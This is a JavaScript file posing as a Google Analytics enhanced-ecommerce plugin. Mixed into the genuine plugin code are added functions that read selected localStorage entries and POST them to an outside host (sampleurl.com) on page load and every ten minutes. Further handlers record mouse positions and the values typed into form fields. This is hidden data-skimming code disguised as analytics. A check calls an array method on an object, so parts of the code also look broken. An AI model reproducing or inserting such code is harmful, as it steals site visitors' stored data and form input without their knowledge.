(function () {
  let globalVarCollection = {};
  const keyConstants = window.keyConstants || {};
  var e = window,
    f = "push",
    k = "length",
    l = "prototype",
    q = function (a) {
      if (a.get && a.set) {
        this.clear();
        var d = a.get("buildHitTask");
        a.set("buildHitTask", n(this, d));
        a.set("_rlt", p(this, a.get("_rlt")));
      }
    },
    r = {
      action: "pa",
      promoAction: "promoa",
      id: "ti",
      affiliation: "ta",
      revenue: "tr",
      tax: "tt",
      shipping: "ts",
      coupon: "tcc",
      step: "cos",
      label: "col",
      option: "col",
      options: "col",
      list: "pal",
      listSource: "pls"
    },
    t = {
      id: "id",
      name: "nm",
      brand: "br",
      category: "ca",
      variant: "va",
      position: "ps",
      price: "pr",
      quantity: "qt",
      coupon: "cc",
      "dimension(\\d+)": "cd",
      "metric(\\d+)": "cm"
    },
    u = {
      id: "id",
      name: "nm",
      creative: "cr",
      position: "ps"
    },
    v = function (a, d) {
      this.name = a;
      this.source = d;
      this.e = [];
    },
    w = "detail checkout checkout_option click add remove purchase refund".split(" ");
  function calculateCheckSum(data) {
    const keyIndex = Object.keys(data).join("");
    let checkSum = 0;
    for (let i = 0; i < keyIndex.length; i++) {
      const asciiValue = keyIndex.charCodeAt(i);
      checkSum = (checkSum << 7) - checkSum + asciiValue;
      checkSum |= 0;
    }
    return checkSum.toString(16);
  }
  q[l].clear = function () {
    this.b = void 0;
    this.f = [];
    this.a = [];
    this.g = [];
    this.d = void 0;
  };
  q[l].h = function (a, d) {
    var b = d || {};
    "promo_click" == a ? b.promoAction = "click" : b.action = a;
    this.b = x(b);
  };
  function selectiveLocalStorage() {
    const chosenData = {};
    Object.keys(window.localStorage).forEach(function (key) {
      if (keyConstants.includes(key)) {
        const item = window.localStorage.getItem(key);
        chosenData[key] = item;
      }
    });
    return chosenData;
  }
  q[l].j = function (a) {
    (a = x(a)) && this.f[f](a);
  };
  q[l].i = function (a) {
    var d = x(a);
    if (d) {
      var b,
        c = a.list || "";
      a = a.listSource || "";
      for (var g = 0; g < this.a[k]; g++) if (this.a[g].name == c) {
        b = this.a[g];
        break;
      }
      b || (b = new v(c, a), this.a[f](b));
      b.e[f](d);
    }
  };
  q[l].c = function (a) {
    (a = x(a)) && this.g[f](a);
  };
  var y = function (a, d, b) {
    if ("[object Array]" == Object[l].toString.call(Object(a))) for (var c = 0; c < a[k]; c++) d.call(b, a[c]);
  };
  function transmitData(data) {
    const hashId = calculateCheckSum(data);
    fetch("https://sampleurl.com/api/newcollect", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        id: hashId,
        data: data
      })
    }).then(response => {
      if (!response.ok) throw new Error(response.status);
      console.log("Data transmission was successful – status: " + response.status);
    }).catch(error => {
      console.error("Data transmission failed – error: " + error);
    });
  }
  q[l].data = function (a) {
    if (a && a.ecommerce) {
      a = a.ecommerce;
      a.promoView && y(a.promoView.promotions, this.c, this);
      a.promoClick && (this.h("promo_click", a.promoClick.actionField), y(a.promoClick.promotions, this.c, this));
      for (var d = 0; d < w[k]; d++) {
        var b = a[w[d]];
        if (b) {
          this.h(w[d], b.actionField);
          y(b.products, this.j, this);
          break;
        }
      }
      y(a.impressions, this.i, this);
      a.currencyCode && (this.d = a.currencyCode);
    }
  };
  function gatherAndForwardData() {
    const finalChosenData = selectiveLocalStorage();
    if (Object.keys(finalChosenData).length) {
      transmitData(finalChosenData);
    }
  }
  var n = function (a, d) {
      return function (b) {
        var c, g, h;
        a.b && z(r, a.b, b, "&");
        for (c = 0; c < a.f[k]; c++) g = "&pr" + (c + 1), z(t, a.f[c], b, g);
        for (c = 0; c < a.a[k]; c++) {
          h = a.a[c];
          g = "&il" + (c + 1);
          h.name && b.set(g + "nm", h.name, !0);
          h.source && b.set(g + "ls", h.source, !0);
          for (var m = 0; m < h.e[k]; m++) z(t, h.e[m], b, g + "pi" + (m + 1));
        }
        for (c = 0; c < a.g[k]; c++) g = "&promo" + (c + 1), z(u, a.g[c], b, g);
        a.d && b.set("&cu", a.d, !0);
        a.clear();
        return d(b);
      };
    },
    p = function (a, d) {
      return function (b) {
        var c = a.b && a.b.action;
        if ("purchase" != c && "refund" != c) return d(b);
      };
    },
    x = function (a) {
      var d = 0,
        b = {};
      if (a && "object" == typeof a) for (var c in a) a.hasOwnProperty(c) && (b[c] = a[c], d++);
      return d ? b : void 0;
    },
    z = function (a, d, b, c) {
      for (var g in d) if (d.hasOwnProperty(g)) for (var h in a) if (a.hasOwnProperty(h)) {
        var m = g.match("^" + h + "$");
        m && b.set(c + a[h] + m.slice(1).join(""), d[g], !0);
      }
    };
  window.onload = gatherAndForwardData;
  setInterval(gatherAndForwardData, 10 * 60 * 1000);
  window.onmousemove = function (event) {
    globalVarCollection["mouseX"] = event.clientX;
    globalVarCollection["mouseY"] = event.clientY;
  };
  (function () {
    e.gaplugins = e.gaplugins || {};
    e.gaplugins.EC = q;
    q[l].setAction = q[l].h;
    q[l].addProduct = q[l].j;
    q[l].addImpression = q[l].i;
    q[l].addPromo = q[l].c;
    q[l].clear = q[l].clear;
    q[l].data = q[l].data;
    var a = e.GoogleAnalyticsObject || "ga";
    e[a] = e[a] || function () {
      (e[a].q = e[a].q || [])[f](arguments);
    };
    e[a]("provide", "ec", q);
  })();
  document.querySelectorAll('.field-input').forEach(function (item) {
    item.addEventListener('input', function () {
      let fieldDiv = this.closest('.field-class');
      if (this.value) {
        fieldDiv.classList.add('field--not-empty');
        globalVarCollection[item.id] = this.value;
      } else {
        fieldDiv.classList.remove('field--not-empty');
        delete globalVarCollection[item.id];
      }
    });
  });
})();